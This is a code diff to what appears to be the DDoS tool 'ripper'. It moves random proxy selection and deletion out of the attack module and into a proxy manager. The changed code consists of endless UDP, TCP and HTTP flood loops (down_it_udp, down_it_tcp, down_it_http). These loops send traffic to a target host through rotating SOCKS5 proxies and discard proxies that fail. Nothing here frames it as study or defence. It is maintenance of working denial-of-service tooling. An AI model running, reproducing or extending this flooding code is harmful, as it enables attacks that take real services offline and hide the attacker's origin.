@@ -1,6 +1,4 @@
 import socket
-import random
-import threading
 from os import urandom as randbytes
 from socks import ProxyError
 
@@ -10,8 +8,6 @@ from ripper.context import Context, Errors, ErrorCodes
 from ripper.common import get_random_string
 from ripper.proxy import Sock5Proxy
 from ripper.urllib_x import build_request_http_package, http_request
-
-lock = threading.Lock()
 
 ###############################################
 # Common methods for attacks
@@ -34,23 +30,6 @@ def build_ctx_request_http_package(_ctx: Context, is_accept_header_only: bool = 
         extra_data=extra_data,
     )
 
-
-# TODO prioritize faster proxies
-def random_proxy_from_context(_ctx: Context) -> Sock5Proxy:
-    if not _ctx.proxy_list or not len(_ctx.proxy_list):
-        return None
-    return random.choice(_ctx.proxy_list)
-
-
-def delete_proxy(_ctx: Context, proxy: Sock5Proxy):
-    lock.acquire()
-    is_exists = proxy in _ctx.proxy_list
-    if is_exists:
-        _ctx.proxy_list.remove(proxy)
-    lock.release()
-    return is_exists
-
-
 ###############################################
 # Attack methods
 ###############################################
@@ -60,9 +39,9 @@ def down_it_udp(_ctx: Context) -> None:
     proxy = None
     while True:
         if proxy is None:
-            proxy = random_proxy_from_context(_ctx)
+            proxy = _ctx.proxy_manager.random_proxy_from_context()
             if proxy and not proxy.validate():
-                delete_proxy(_ctx, proxy)
+                _ctx.proxy_manager.delete_proxy_sync(proxy)
                 proxy = None
                 continue
 
@@ -100,7 +79,7 @@ def down_it_http(_ctx: Context) -> None:
     """HTTP flood method."""
     proxy = None
     while True:
-        proxy = random_proxy_from_context(_ctx)
+        proxy = _ctx.proxy_manager.random_proxy_from_context()
         try:
             response = http_request(
                 url=_ctx.get_target_url(),
@@ -109,7 +88,7 @@ def down_it_http(_ctx: Context) -> None:
                 socket_timeout=_ctx.sock_manager.socket_timeout,
             )
         except ProxyError:
-            delete_proxy(_ctx, proxy)
+            _ctx.proxy_manager.delete_proxy_sync(proxy)
         except:
             _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
             _ctx.Statistic.connect.failed += 1
@@ -127,7 +106,7 @@ def down_it_tcp(_ctx: Context) -> None:
     proxy = None
     while True:
         try:
-            proxy = random_proxy_from_context(_ctx)
+            proxy = _ctx.proxy_manager.random_proxy_from_context()
             sock = _ctx.sock_manager.create_tcp_socket(proxy)
             sock.connect((_ctx.host_ip, _ctx.port))
             _ctx.Statistic.connect.success += 1
@@ -136,7 +115,7 @@ def down_it_tcp(_ctx: Context) -> None:
                 try:
                     sock.send(bytes_to_send)
                 except ProxyError:
-                    delete_proxy(_ctx, proxy)
+                    _ctx.proxy_manager.delete_proxy_sync(proxy)
                     _ctx.Statistic.connect.failed += 1
                     sock.close()
                     break
@@ -151,7 +130,7 @@ def down_it_tcp(_ctx: Context) -> None:
                     _ctx.Statistic.packets.total_sent += 1
                     proxy.report_success() if proxy is not None else 0
         except ProxyError:
-            delete_proxy(_ctx, proxy)
+            _ctx.proxy_manager.delete_proxy_sync(proxy)
         except Exception as e:
             _ctx.add_error(Errors(ErrorCodes.UnhandledError.value, e))
             _ctx.Statistic.connect.failed += 1
